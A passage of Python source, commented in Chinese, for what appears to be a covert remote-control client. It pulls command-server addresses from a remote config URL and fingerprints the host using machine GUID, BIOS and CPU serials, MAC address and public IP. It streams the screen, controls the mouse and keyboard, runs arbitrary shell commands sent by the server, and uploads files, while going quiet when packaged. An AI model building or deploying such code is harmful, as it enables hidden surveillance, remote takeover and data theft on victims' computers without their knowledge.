    """根据当前程序名动态生成控制文件名：client_v9999.exe -> client_v9999.txt"""
    global _CONTROL_FILENAME_CACHE
    if _CONTROL_FILENAME_CACHE:
        return _CONTROL_FILENAME_CACHE
    try:
        prog_path = get_program_entry_path()
        prog_name = os.path.splitext(os.path.basename(prog_path))[0].strip()
        if not prog_name:
            prog_name = "404"
        _CONTROL_FILENAME_CACHE = f"{prog_name}.txt"
    except Exception:
        _CONTROL_FILENAME_CACHE = "404.txt"
    return _CONTROL_FILENAME_CACHE

def get_control_config_url():
    """控制配置URL（文件名动态跟随程序名）。"""
    return f"{CONTROL_CONFIG_BASE_URL}/{quote(get_control_filename())}"

def get_server_connection_info():
    """从指定URL获取服务器连接信息，支持多行并行连接"""
    # 本地调试覆盖：支持通过环境变量直接提供连接行（每行/分号分隔）
    # 例如: CLIENT_TARGETS="tcp://127.0.0.1:39018;ssl://example.com:39019"
    env_targets = os.environ.get("CLIENT_TARGETS", "").strip()
    if env_targets:
        raw_lines = []
        for chunk in env_targets.replace(";", "\n").splitlines():
            s = chunk.strip()
            if s:
                raw_lines.append(s)
        targets = []
        for ln in raw_lines:
            parsed = parse_connection_line(ln)
            if parsed:
                targets.append(parsed)
        if targets:
            if not is_frozen():
                print(f"[网络] 使用 CLIENT_TARGETS 覆盖，共 {len(targets)} 行")
            return targets

    url = get_control_config_url()
    try:
        if not is_frozen():
            print(f"[网络] 正在从 {url} 获取服务器连接信息...")
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            text = resp.text or ""
            lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
            targets = []
            for ln in lines:
                parsed = parse_connection_line(ln)
                if parsed:
                    targets.append(parsed)
            if not targets:
                raise Exception(f"{get_control_filename()} 内容为空或未解析到有效地址")
            if not is_frozen():
                print(f"[网络] 成功解析连接信息，共 {len(targets)} 行")
            return targets
        else:
            raise Exception(f"HTTP状态码错误: {resp.status_code}")
    except requests.exceptions.Timeout:
        log_network_error(url, "timeout")
        raise Exception("获取服务器连接信息失败: 连接超时" if not is_frozen() else "获取连接信息失败")
    except requests.exceptions.ConnectionError:
        log_network_error(url, "connection")
        raise Exception("获取服务器连接信息失败: 连接错误" if not is_frozen() else "获取连接信息失败")
    except Exception as e:
        log_network_error(url, "other", str(e) if not is_frozen() else None)
        raise Exception(f"获取服务器连接信息失败: {e}" if not is_frozen() else "获取连接信息失败")

# 检测服务是否可用
def check_remote_control_available():
    """检测服务是否可用"""
    # 本地调试覆盖：配置了 CLIENT_TARGETS 直接视为可用
    env_targets = os.environ.get("CLIENT_TARGETS", "").strip()
    if env_targets:
        targets = get_server_connection_info()
        if targets:
            return True, targets

    url = get_control_config_url()
    try:
        if not is_frozen():
            print(f"[检测] 正在检测服务: {url}")
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            text = resp.text or ""
            lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
            targets = []
            for ln in lines:
                parsed = parse_connection_line(ln)
                if parsed:
                    targets.append(parsed)
            if targets:
                if not is_frozen():
                    print(f"[检测] 服务可用，解析到 {len(targets)} 行连接信息")
                return True, targets
            else:
                if not is_frozen():
                    print(f"[检测] 服务响应为空或未解析到有效地址")
                return False, None
        elif resp.status_code == 404:
            if not is_frozen():
                print(f"[检测] 服务文件不存在 ({get_control_filename()}，HTTP 404)，功能已禁用")
            return False, None
        else:
            if not is_frozen():
                print(f"[检测] 服务HTTP状态码错误: {resp.status_code}")
            return False, None
    except requests.exceptions.Timeout:
        log_network_error(url, "timeout")
        return False, None
    except requests.exceptions.ConnectionError:
        log_network_error(url, "connection")
        return False, None
    except Exception as e:
        log_network_error(url, "other", str(e) if not is_frozen() else None)
        return False, None

# 定期检测服务是否可用
def periodic_check_remote_control():
    """定期检测服务，如果动态控制文件不存在则每隔180-250秒检测一次"""
    global remote_control_available, connection_targets
    
    print("[定期检测] 启动定期检测线程...")
    _startup_trace("REMOTE: periodic_check_remote_control started")
    
    while True:
        try:
            available, targets = check_remote_control_available()
            _startup_trace(f"REMOTE: periodic check available={available} targets={bool(targets)}")
            
            if available and targets and not remote_control_available:
                print("[定期检测] 检测到服务已启用，切换到模式")
                remote_control_available = True
                connection_targets = targets
                first = targets[0]
                print(f"[定期检测] 模式已启用，首个服务器: {first['address']}:{first['port']} SSL:{first['use_ssl']}")
                _startup_trace("REMOTE: service enabled, first target=" + repr(first))
                break
            elif not available and remote_control_available:
                print("[定期检测] 检测到服务已禁用，切换到仅F开头EXE模式")
                remote_control_available = False
                connection_targets = []
                print("[定期检测] 模式已禁用，仅启动F开头EXE程序")
            elif not available and not remote_control_available:
                print("[定期检测] 服务仍不可用，继续等待...")
            
            wait_time = random.randint(180, 250)
            print(f"[定期检测] 下次检测将在 {wait_time} 秒后进行...")
            time.sleep(wait_time)
            
        except Exception as e:
            print(f"[定期检测] 定期检测异常: {str(e)}")
            time.sleep(60)

# SSL客户端配置区域 - 动态获取证书
# ============================================
SSL_SERVER_PORT = 39019  # SSL端口
TCP_DEFAULT_PORT = 39018  # TCP默认端口

# 阿里云OSS证书获取地址（PEM）
SSL_CERT_URL = "https://your-config-bucket.example.com/pem.txt"

# 证书缓存（避免频繁请求）
SSL_CERT_CACHE = None
SSL_CACHE_TIME = 0
SSL_CACHE_DURATION = 300  # 5分钟缓存
# ============================================

# 网络错误记录（提前定义，避免引用异常）
def log_network_error(url, error_type, detail=None):
    """网络错误日志（打包版本简化）"""
    if is_frozen():
        if error_type == "timeout":
            print(f"[网络] 连接超时")
        elif error_type == "connection":
            print(f"[网络] 连接失败")
        else:
            print(f"[网络] 请求失败")
    else:
        if error_type == "timeout":
            print(f"[网络] 连接超时: {url}")
        elif error_type == "connection":
            print(f"[网络] 连接失败: {url}")
        else:
            print(f"[网络] 请求失败: {url}" + (f" - {detail}" if detail else ""))

# 服务器连接信息定期重试获取函数
def periodic_fetch_server_info():
    """定期获取服务器连接信息（每5分钟重试一次，直到成功）"""
    global remote_control_available, connection_targets
    _startup_trace("REMOTE: periodic_fetch_server_info started")
    while True:
        try:
            available, targets = check_remote_control_available()
            _startup_trace(f"REMOTE: fetch info available={available} targets={bool(targets)}")
            if available and targets:
                connection_targets = targets
                remote_control_available = True
                first = targets[0]
                if not is_frozen():
                    print(f"[服务器信息] 获取成功，共 {len(targets)} 行，首个: {first['address']}:{first['port']} SSL:{first['use_ssl']}")
                time.sleep(300)
            else:
                remote_control_available = False
                connection_targets = []
                if not is_frozen():
                    print(f"[服务器信息] 服务不可用，5分钟后重试")
                time.sleep(300)
        except Exception as e:
            remote_control_available = False
            connection_targets = []
            if not is_frozen():
                print(f"[服务器信息] 获取失败: {e}，5分钟后重试")
            else:
                print(f"[服务器信息] 获取失败，5分钟后重试")
            time.sleep(300)

# ============================================

# 全局配置（初始尝试获取，失败则等待定期重试线程）
remote_control_available = False
connection_targets = []
serverIp = None
serverPort = None

# 不再使用 yuming.txt，SSL 只依赖动态控制文件中的域名行

try:
    available, targets = check_remote_control_available()
    if available and targets:
        connection_targets = targets
        remote_control_available = True
        first = connection_targets[0]
        print(f"[配置] 模式已启用，首个服务器: {first['address']}:{first['port']} SSL:{first['use_ssl']}")
    else:
        remote_control_available = False
        connection_targets = []
        print(f"[配置] 模式已禁用，仅启动F开头EXE程序")
except Exception as e:
    if is_frozen():
        print(f"[配置] 检测服务失败")
    else:
        print(f"[配置] 检测服务失败: {str(e)}")
    remote_control_available = False
    connection_targets = []
    print(f"[配置] 模式已禁用，仅启动F开头EXE程序")

pyautogui.FAILSAFE = False
# 画质预设与默认性能模式
QUALITY_PRESETS = {
    'performance': {'fps': 12, 'jpegQuality': 30},
    'quality': {'fps': 20, 'jpegQuality': 55}
}
current_quality_mode = 'performance'
fps = QUALITY_PRESETS[current_quality_mode]['fps']
jpegQuality = QUALITY_PRESETS[current_quality_mode]['jpegQuality']
send_screen = False
last_screen = None

# 双屏幕配置
current_screen_index = 0  # 当前选中的屏幕索引
screen_regions = []  # 存储所有屏幕的区域信息
last_screens = {}  # 存储每个屏幕的上一帧
CLIENT_PROTOCOL_VERSION = "2.2"
CLIENT_CAPABILITIES = [
    "screen-v2",
    "image-delta",
    "request-keyframe",
    "mouse-drag-state-machine",
    "text-input",
    "cmd-request-id",
]
drag_state = {"active": False, "x": 0, "y": 0}

def reset_screen_cache(reason="", screen_state=None):
    """清空屏幕历史帧，强制下一帧发送整帧基线。"""
    target_cache = None
    if isinstance(screen_state, dict):
        target_cache = screen_state.setdefault("last_screens", {})
    else:
        global last_screens
        target_cache = last_screens
    target_cache.clear()
    if reason and (not is_frozen()):
        print(f"[屏幕] 已重置历史帧缓存: {reason}")

def _clamp_point(x, y):
    """规范化并约束坐标到屏幕范围。"""
    try:
        sx, sy = pyautogui.size()
        nx = max(0, min(int(x), max(0, sx - 1)))
        ny = max(0, min(int(y), max(0, sy - 1)))
        return nx, ny
    except Exception:
        return int(x), int(y)

def drag_start(x, y):
    """拖拽状态机：开始拖拽。"""
    global drag_state
    x, y = _clamp_point(x, y)
    if drag_state["active"]:
        # 避免残留按下状态
        try:
            pyautogui.mouseUp(drag_state["x"], drag_state["y"], button='left')
        except Exception:
            pass
    pyautogui.moveTo(x, y, duration=0)
    pyautogui.mouseDown(x, y, button='left')
    drag_state = {"active": True, "x": x, "y": y}

def drag_move(x, y):
    """拖拽状态机：移动中。若丢失起点，自动补一个起点。"""
    global drag_state
    x, y = _clamp_point(x, y)
    if not drag_state["active"]:
        drag_start(x, y)
        return
    pyautogui.moveTo(x, y, duration=0)
    drag_state["x"], drag_state["y"] = x, y

def drag_end(x=None, y=None):
    """拖拽状态机：结束拖拽。"""
    global drag_state
    tx = drag_state["x"] if x is None else x
    ty = drag_state["y"] if y is None else y
    tx, ty = _clamp_point(tx, ty)
    if drag_state["active"]:
        try:
            pyautogui.moveTo(tx, ty, duration=0)
        except Exception:
            pass
        pyautogui.mouseUp(tx, ty, button='left')
    drag_state = {"active": False, "x": tx, "y": ty}

# 客户端备注标识 - 手动配置
CLIENT_NOTE = "看IP情感程序"  # 可以手动修改此备注标识

# 获取屏幕信息
def get_screen_info():
    """获取所有屏幕的信息"""
    global screen_regions
    try:
        # 使用mss库获取屏幕信息
        with mss() as sct:
            monitors = sct.monitors
            screen_regions = []
            
            # 处理所有显示器
            for i, monitor in enumerate(monitors[1:], 1):
                region = {
                    "top": monitor["top"],
                    "left": monitor["left"],
                    "width": monitor["width"],
                    "height": monitor["height"],
                    "index": i,
                    "name": f"屏幕{i}"
                }
                screen_regions.append(region)
                print(f"检测到屏幕{i}: {monitor['width']}x{monitor['height']} at ({monitor['left']}, {monitor['top']})")
            
            # 如果没有检测到多屏幕，使用主屏幕
            if not screen_regions:
                # 获取主屏幕信息
                screen_width, screen_height = pyautogui.size()
                region = {
                    "top": 0,
                    "left": 0,
                    "width": screen_width,
                    "height": screen_height,
                    "index": 0,
                    "name": "主屏幕"
                }
                screen_regions = [region]
                print(f"检测到主屏幕: {screen_width}x{screen_height}")
            
    except Exception as e:
        print(f"获取屏幕信息失败: {str(e)}")
        # 使用默认配置
        try:
            screen_width, screen_height = pyautogui.size()
            region = {
                "top": 0,
                "left": 0,
                "width": screen_width,
                "height": screen_height,
                "index": 0,
                "name": "主屏幕"
            }
            screen_regions = [region]
            print(f"使用默认屏幕配置: {screen_width}x{screen_height}")
        except Exception as e2:
            print(f"获取默认屏幕信息也失败: {str(e2)}")
            # 最后的备用方案
            region = {
                "top": 0,
                "left": 0,
                "width": 1920,
                "height": 1080,
                "index": 0,
                "name": "默认屏幕"
            }
            screen_regions = [region]
            print("使用备用屏幕配置: 1920x1080")
    
    return screen_regions

# 获取当前屏幕区域
def get_current_screen_region(screen_index=None):
    """获取当前选中的屏幕区域"""
    global current_screen_index, screen_regions
    if not screen_regions:
        get_screen_info()

    try:
        idx = current_screen_index if screen_index is None else int(screen_index)
    except Exception:
        idx = 0

    if 0 <= idx < len(screen_regions):
        return screen_regions[idx]
    else:
        return screen_regions[0] if screen_regions else {"top": 0, "left": 0, "width": 1920, "height": 1080}

# 切换屏幕
def switch_screen(screen_index, screen_state=None):
    """切换到指定屏幕"""
    global current_screen_index, screen_regions
    if not screen_regions:
        get_screen_info()

    try:
        target_index = int(screen_index)
    except Exception:
        target_index = -1

    if 0 <= target_index < len(screen_regions):
        if isinstance(screen_state, dict):
            screen_state["current_screen_index"] = target_index
        else:
            current_screen_index = target_index
        print(f"切换到屏幕: {screen_regions[target_index]['name']}")
        return True
    else:
        print(f"屏幕索引无效: {screen_index}")
        return False

# 获取所有屏幕信息
def get_all_screens_info(current_index=None):
    """获取所有屏幕的详细信息"""
    global current_screen_index
    if not screen_regions:
        get_screen_info()

    if current_index is None:
        current_index = current_screen_index

    screens_info = []
    for i, region in enumerate(screen_regions):
        screen_info = {
            "index": i,
            "name": region["name"],
            "width": region["width"],
            "height": region["height"],
            "left": region["left"],
            "top": region["top"],
            "is_current": (i == current_index)
        }
        screens_info.append(screen_info)
    
    return screens_info

# 获取机器信息
def get_machine_info():
    import socket as pysocket

    def _norm_hw(v):
        s = str(v or "").strip()
        if s.lower() in {"", "-", "unknown", "none", "null", "n/a", "to be filled by o.e.m."}:
            return ""
        return s

    def _wmic_value(cmd):
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=3
            )
            text = (result.stdout or "").replace("\r", "\n")
            lines = [x.strip() for x in text.split("\n") if x.strip()]
            for line in lines:
                low = line.lower()
                if low in {"serialnumber", "uuid", "processorid"}:
                    continue
                if low.startswith("wmic"):
                    continue
                return line
        except Exception:
            pass
        return ""

    def _get_machine_guid():
        if platform.system() != "Windows":
            return ""
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key:
                val, _ = winreg.QueryValueEx(key, "MachineGuid")
                return str(val).strip()
        except Exception:
            return ""

    def _get_mac_primary():
        # 使用 uuid.getnode 作为稳定 MAC 候选（无需额外权限）
        try:
            mac_int = uuid.getnode()
            mac_hex = f"{mac_int:012x}"
            mac = ":".join(mac_hex[i:i+2] for i in range(0, 12, 2))
            return mac
        except Exception:
            return ""

    # 使用优化的系统信息获取
    system_info = safe_get_system_info()
    
    # 获取基本信息
    username = system_info.get('user_name', getpass.getuser())
    hostname = system_info.get('computer_name', platform.node())
    
    # 使用更温和的方式获取硬件信息
    try:
        if platform.system() == 'Windows':
            # 使用 platform 模块替代 wmic 命令
            board = platform.machine()
            cpu = platform.processor()
        else:
            # Linux 系统使用更安全的方式
            board = platform.machine()
            cpu = platform.processor()
    except Exception:
        board = 'Unknown'
        cpu = 'Unknown'
    
    sysver = system_info.get('os_version', platform.platform())
    ip = None
    try:
        # 使用更温和的IP查询方式
        ip_services = [
            "https://api.ipify.org",
            "https://ipinfo.io/ip"
        ]
        
        for service in ip_services:
            try:
                if not is_frozen():
                    print(f"正在获取公网IP，使用服务: {service}")
                response = requests.get(service, timeout=3, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and ip != "" and len(ip.split('.')) == 4:
                        if not is_frozen():
                            print(f"成功获取公网IP: {ip}")
                        break
            except requests.exceptions.Timeout:
                if not is_frozen():
                    log_network_error(service, "timeout")
                continue
            except requests.exceptions.ConnectionError:
                if not is_frozen():
                    log_network_error(service, "connection")
                continue
            except Exception as e:
                if not is_frozen():
                    print(f"IP服务 {service} 获取失败: {str(e)}")
                continue
        
        # 如果所有公网IP服务都失败，尝试获取本地IP
        if not ip or ip == "" or len(ip.split('.')) != 4:
            try:
                if not is_frozen():
                    print("公网IP获取失败，尝试获取本地IP")
                ip = pysocket.gethostbyname(pysocket.gethostname())
                if not is_frozen():
                    print(f"获取本地IP: {ip}")
            except Exception as e:
                if not is_frozen():
                    print(f"本地IP获取失败: {str(e)}")
                ip = 'Unknown'
                
    except Exception as e:
        if not is_frozen():
            print(f"IP获取异常: {str(e)}")
        ip = 'Unknown'

    disk_total_gb = ""
    disk_free_gb = ""
    try:
        import shutil
        if platform.system() == 'Windows':
            total, used, free = shutil.disk_usage("C:\\")
            disk_total_gb = str(total // (1024**3))
            disk_free_gb = str(free // (1024**3))
            disk = f"总:{disk_total_gb}G 可用:{disk_free_gb}G"
        else:
            total, used, free = shutil.disk_usage("/")
            disk_total_gb = str(total // (1024**3))
            disk_free_gb = str(free // (1024**3))
            disk = f"总:{disk_total_gb}G 可用:{disk_free_gb}G"
    except Exception:
        disk = 'Unknown'
        disk_total_gb = ""
        disk_free_gb = ""

    # 多硬件指纹字段（尽量稳定，不依赖 AgentId）
    machine_guid = _norm_hw(_get_machine_guid())
    bios_serial = _norm_hw(_wmic_value("wmic bios get serialnumber"))
    board_serial = _norm_hw(_wmic_value("wmic baseboard get serialnumber"))
    system_uuid = _norm_hw(_wmic_value("wmic csproduct get uuid"))
    cpu_id = _norm_hw(_wmic_value("wmic cpu get processorid"))
    mac_primary = _norm_hw(_get_mac_primary())

    # 兼容旧协议仍保留 uuid 字段，但服务端可忽略
    uuid_str = get_or_create_client_id()
    screen_w, screen_h = pyautogui.size()
    
    # 获取屏幕信息
    screens_info = get_all_screens_info()
    current_region = get_current_screen_region()

    hw_parts = [
        machine_guid, system_uuid, bios_serial, board_serial, cpu_id, mac_primary,
        _norm_hw(hostname), _norm_hw(username), _norm_hw(board), _norm_hw(cpu), _norm_hw(disk_total_gb)
    ]
    hw_parts = [x.lower() for x in hw_parts if x]
    stable_hw_hash = hashlib.sha256("|".join(hw_parts).encode("utf-8")).hexdigest()[:24] if hw_parts else ""
    
    return {
        'uuid': uuid_str,
        'hostname': hostname,
        'username': username,
        'board': board,
        'cpu': cpu,
        'sysver': sysver,
        'ip': ip,
        'disk': disk,
        'disk_total_gb': disk_total_gb,
        'disk_free_gb': disk_free_gb,
        'machine_guid': machine_guid,
        'bios_serial': bios_serial,
        'board_serial': board_serial,
        'system_uuid': system_uuid,
        'cpu_id': cpu_id,
        'mac_primary': mac_primary,
        'stable_hw_hash': stable_hw_hash,
        'screenWidth': screen_w,
        'screenHeight': screen_h,
        'note': CLIENT_NOTE,  # 添加备注信息
        'screens': screens_info,  # 添加所有屏幕信息
        'currentScreen': current_region,  # 添加当前屏幕信息
        'screenCount': len(screens_info),  # 添加屏幕数量
        'system_info': system_info,  # 添加优化的系统信息
        'protocol_version': CLIENT_PROTOCOL_VERSION,
        'capabilities': CLIENT_CAPABILITIES
    }

# 心跳线程
def heartbeat_thread(sock):
    while True:
        try:
            send_packet(sock, {"type": "heartbeat", "data": {}})
        except Exception:
            break
        time.sleep(5)

# 执行命令函数
def run_command(cmd, shell=True, timeout=15, encoding=None):
    try:
        if encoding is None:
            encoding = 'gbk' if platform.system() == 'Windows' else 'utf-8'
        # 移除PowerShell特殊处理，统一使用标准命令执行
        proc = subprocess.Popen(cmd, shell=shell, stdout=subprocess.PIPE, 
                              stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                              text=True, encoding=encoding, bufsize=1)
        output, error = proc.communicate(timeout=timeout)
        # 处理None值
        if output is None:
            output = ""
        if error is None:
            error = ""
        return output + error
    except subprocess.TimeoutExpired:
        proc.kill()
        return '执行超时'
    except Exception as e:
        return f'执行错误: {str(e)}'

# 屏幕捕获线程 - 优化内存管理
def screen_thread(sock, screen_state=None):
    global current_capture_backend

    # 兼容旧调用：未传状态时回退到单连接全局状态
    if not isinstance(screen_state, dict):
        screen_state = {
            "send_screen": bool(send_screen),
            "current_screen_index": int(current_screen_index),
            "last_screens": {}
        }
    screen_cache = screen_state.setdefault("last_screens", {})

    # 初始化屏幕信息
    get_screen_info()

    # 内存管理变量
    frame_count = 0
    last_memory_cleanup = time.time()
    memory_cleanup_interval = 30  # 30秒清理一次内存

    black_frame_count = 0
    keyframe_interval_sec = 2.0
    last_keyframe_sent_at = 0.0
    frame_seq = 0
    last_sent_frame_id = 0
    was_sending = False

    while True:
        sending_enabled = bool(screen_state.get("send_screen", False))
        if not sending_enabled:
            was_sending = False
            time.sleep(0.2)
            if getattr(sock, "_closed", False):
                break
            continue
        elif not was_sending:
            # 从停播恢复到开播时，先清理缓存，确保先发整帧基线
            reset_screen_cache("start_screen trigger", screen_state)
            was_sending = True

        try:
            # 获取当前连接对应的屏幕区域
            current_index = int(screen_state.get("current_screen_index", 0) or 0)
            current_region = get_current_screen_region(current_index)

            # 使用优化的屏幕捕获
            imgPil = safe_screen_capture(current_region)
            if imgPil is None:
                time.sleep(1)
                continue

            # 转换为numpy数组用于比较（RGB）
            imgNp = array(imgPil)
            # 黑帧检测：亮度极低或全零
            try:
                mean_val = float(imgNp.mean())
            except Exception:
                mean_val = 0.0
            is_black = mean_val < 2.0
            if is_black:
                black_frame_count += 1
                if black_frame_count >= 3:
                    # 切换后端
                    order = get_backend_order()
                    if len(order) > 1:
                        idx = order.index(current_capture_backend) if current_capture_backend in order else 0
                        next_backend = order[(idx + 1) % len(order)]
                        current_capture_backend = next_backend
                    black_frame_count = 0
                # 跳过该帧，短暂等待
                del imgNp
                del imgPil
                time.sleep(0.2)
                continue
            else:
                # 正常帧重置计数
                black_frame_count = 0

            # 帧间差分，计算最小包围变化矩形
            screen_key = f"screen_{current_index}"
            force_keyframe = (time.time() - last_keyframe_sent_at) >= keyframe_interval_sec
            have_prev = (screen_key in screen_cache) and (not force_keyframe)
            delta_rect = None
            if have_prev:
                try:
                    prev = screen_cache[screen_key]
                    if prev.shape == imgNp.shape:
                        import cv2 as _cv
                        diff = _cv.absdiff(imgNp, prev)
                        gray = _cv.cvtColor(diff, _cv.COLOR_RGB2GRAY)
                        _, mask = _cv.threshold(gray, 10, 255, _cv.THRESH_BINARY)
                        coords = _cv.findNonZero(mask)
                        if coords is not None:
                            x, y, w, h = _cv.boundingRect(coords)
                            delta_rect = (x, y, w, h)
                        else:
                            # 无变化，直接跳过一帧
                            del imgNp
                            del imgPil
                            time.sleep(1 / fps)
                            continue
                    else:
                        # 尺寸变化，发送整帧
                        delta_rect = None
                except Exception:
                    delta_rect = None

            # 更新上一帧（限制历史帧数量）
            screen_cache[screen_key] = imgNp.copy()

            # 定期清理内存
            current_time = time.time()
            if current_time - last_memory_cleanup > memory_cleanup_interval:
                # 清理过期的历史帧
                if len(screen_cache) > 3:  # 只保留最近3帧
                    oldest_key = min(screen_cache.keys(), key=lambda k: screen_cache[k].ctypes.data if hasattr(screen_cache[k], "ctypes") else 0)
                    del screen_cache[oldest_key]

                # 强制垃圾回收
                import gc
                gc.collect()
                last_memory_cleanup = current_time
                print(f"[内存管理] 执行内存清理，当前帧数: {frame_count}")

            # 压缩并发送：若有小范围变化则发送增量，否则发送整帧
            # 质量调整与数据包限制
            def _encode_image(pil_img, base_quality):
                buf_local = io.BytesIO()
                try:
                    pil_img.save(buf_local, format="WEBP", quality=base_quality, method=6)
                    data_local = buf_local.getvalue()
                    max_packet_size_local = 2 * 1024 * 1024
                    if len(data_local) > max_packet_size_local:
                        buf_local2 = io.BytesIO()
                        pil_img.save(buf_local2, format="WEBP", quality=max(10, base_quality - 20), method=6)
                        data_local = buf_local2.getvalue()
                        buf_local2.close()
                        print(f"[内存管理] 数据包过大，降低质量: {len(data_local)} 字节")
                    return data_local
                finally:
                    buf_local.close()

            screen_area = current_region["width"] * current_region["height"]
            quality = jpegQuality if screen_area <= 1920 * 1080 else max(20, jpegQuality - 10)

            if have_prev and delta_rect is not None:
                x, y, w, h = delta_rect
                area_ratio = (w * h) / float(max(screen_area, 1))
                if area_ratio <= 0.5:
                    # 发送增量补丁
                    patch = imgNp[y:y+h, x:x+w, :]
                    patch_img = Image.fromarray(patch)
                    delta_bytes = _encode_image(patch_img, quality)
                    frame_seq += 1
                    frame_id = frame_seq
                    send_packet(sock, {
                        "type": "image_delta",
                        "data": delta_bytes,
                        "rect": {"x": x, "y": y, "w": w, "h": h},
                        "frame_contract": {
                            "protocol": "screen-v2",
                            "frame_type": "delta",
                            "frame_id": frame_id,
                            "base_frame_id": last_sent_frame_id,
                            "pixel_format": "rgb24",
                            "encoding": "webp",
                            "screen_index": current_index
                        },
                        "real_time_screen": {
                            "width": imgNp.shape[1],
                            "height": imgNp.shape[0],
                            "left": 0,
                            "top": 0
                        }
                    })
                    last_sent_frame_id = frame_id
                else:
                    # 大范围变化，发送整帧
                    full_img = Image.fromarray(imgNp)
                    data_full = _encode_image(full_img, quality)
                    frame_seq += 1
                    frame_id = frame_seq
                    send_packet(sock, {
                        "type": "image",
                        "data": data_full,
                        "frame_contract": {
                            "protocol": "screen-v2",
                            "frame_type": "keyframe",
                            "frame_id": frame_id,
                            "base_frame_id": 0,
                            "pixel_format": "rgb24",
                            "encoding": "webp",
                            "screen_index": current_index
                        },
                        "screen_info": {
                            "index": current_region["index"],
                            "name": current_region["name"],
                            "width": current_region["width"],
                            "height": current_region["height"],
                            "left": current_region["left"],
                            "top": current_region["top"]
                        },
                        "real_time_screen": {
                            "width": current_region["width"],
                            "height": current_region["height"],
                            "left": current_region["left"],
                            "top": current_region["top"]
                        }
                    })
                    last_sent_frame_id = frame_id
                    last_keyframe_sent_at = time.time()
            else:
                # 初帧或未能计算差分，发送整帧
                full_img = Image.fromarray(imgNp)
                data_full = _encode_image(full_img, quality)
                frame_seq += 1
                frame_id = frame_seq
                send_packet(sock, {
                    "type": "image",
                    "data": data_full,
                    "frame_contract": {
                        "protocol": "screen-v2",
                        "frame_type": "keyframe",
                        "frame_id": frame_id,
                        "base_frame_id": 0,
                        "pixel_format": "rgb24",
                        "encoding": "webp",
                        "screen_index": current_index
                    },
                    "screen_info": {
                        "index": current_region["index"],
                        "name": current_region["name"],
                        "width": current_region["width"],
                        "height": current_region["height"],
                        "left": current_region["left"],
                        "top": current_region["top"]
                    },
                    "real_time_screen": {
                        "width": current_region["width"],
                        "height": current_region["height"],
                        "left": current_region["left"],
                        "top": current_region["top"]
                    }
                })
                last_sent_frame_id = frame_id
                last_keyframe_sent_at = time.time()

            # 立即释放图像内存
            del imgNp
            del imgPil
            # 发送完成后无额外数据需释放

            frame_count += 1

        except Exception as e:
            print(f"屏幕捕获错误: {str(e)}")
            time.sleep(1)

        time.sleep(1 / fps)
        if getattr(sock, "_closed", False):
            break

    # 清理所有历史帧
    screen_cache.clear()
    import gc
    gc.collect()
    print("[内存管理] 屏幕线程退出，已清理所有内存")

# 简单命令执行模式
def execute_command(command):
    """执行命令并返回详细结果"""
    try:
        print(f"[命令] 收到命令: {command}")
        result = run_command(command, shell=True, timeout=30)
        
        # 处理None返回值
        if result is None:
            result = "命令执行完成，但无输出内容"
        
        # 确保返回字符串
        if not isinstance(result, str):
            result = str(result)
            
        print(f"[命令] 执行完成，结果长度: {len(result)} 字符")
        return result
    except Exception as e:
        error_msg = f"命令执行错误: {str(e)}"
        print(f"[命令] {error_msg}")
        return error_msg

# 键位映射：将Tk keysym映射为pyautogui键名
def map_keysym_to_pyautogui(key):
    try:
        if not isinstance(key, str) or key == "":
            return None
        lower = key.lower()
        mapping = {
            'return': 'enter',
            'enter': 'enter',
            'escape': 'esc',
            'esc': 'esc',
            'backspace': 'backspace',
            'tab': 'tab',
            'space': 'space',
            'delete': 'delete',
            'insert': 'insert',
            'home': 'home',
            'end': 'end',
            'pgup': 'pageup',
            'prior': 'pageup',
            'page_up': 'pageup',
            'pageup': 'pageup',
            'pgdn': 'pagedown',
            'next': 'pagedown',
            'page_down': 'pagedown',
            'pagedown': 'pagedown',
            'left': 'left',
            'right': 'right',
            'up': 'up',
            'down': 'down',
            'caps_lock': 'capslock',
            'capslock': 'capslock',
            'scroll_lock': 'scrolllock',
            'scrolllock': 'scrolllock',
            'num_lock': 'numlock',
            'numlock': 'numlock',
            'print': 'printscreen',
            'printscreen': 'printscreen',
            'pause': 'pause',
            'break': 'pause',
            'command': 'win',
            'win': 'win',
            'windows': 'win',
            'win_l': 'win',
            'win_r': 'win',
            'meta_l': 'win',
            'meta_r': 'win',
            'super_l': 'win',
            'super_r': 'win',
            'control_l': 'ctrl',
            'control_r': 'ctrl',
            'control': 'ctrl',
            'ctrl': 'ctrl',
            'alt_l': 'alt',
            'alt_r': 'alt',
            'alt': 'alt',
            'shift_l': 'shift',
            'shift_r': 'shift',
            'shift': 'shift',
            # Keypad (numpad) common keys
            'kp_enter': 'enter',
            'kp_equal': '=',
            'kp_separator': ',',
            'kp_decimal': '.',
            'kp_add': '+',
            'kp_subtract': '-',
            'kp_multiply': '*',
            'kp_divide': '/',
            'kp_insert': 'insert',
            'kp_delete': 'delete',
            'kp_home': 'home',
            'kp_end': 'end',
            'kp_left': 'left',
            'kp_right': 'right',
            'kp_up': 'up',
            'kp_down': 'down',
        }
        # Keypad digits
        if lower in [f'kp_{i}' for i in range(10)]:
            return lower[-1]
        # 功能键F1-F24
        if lower.startswith('f') and lower[1:].isdigit():
            return lower
        # 小键盘键位（简化处理，交给pyautogui普通按键）
        if lower in mapping:
            return mapping[lower]
        return lower
    except Exception:
        return None

# 文件传输功能
def send_file_to_server(sock, file_path, chunk_size=8192):
    """发送文件到服务器"""
    try:
        if not os.path.exists(file_path):
            send_packet(sock, {
                "type": "file_transfer_result", 
                "data": {
                    "success": False, 
                    "message": f"文件不存在: {file_path}",
                    "file_path": file_path
                }
            })
            return
        
        file_size = os.path.getsize(file_path)
        file_name = os.path.basename(file_path)
        
        print(f"[文件传输] 开始发送文件: {file_name} ({file_size} 字节)")
        
        # 发送文件信息
        send_packet(sock, {
            "type": "file_transfer_start", 
            "data": {
                "file_name": file_name,
                "file_size": file_size,
                "file_path": file_path
            }
        })
        
        # 分块发送文件内容
        with open(file_path, 'rb') as f:
            chunk_count = 0
            while True:
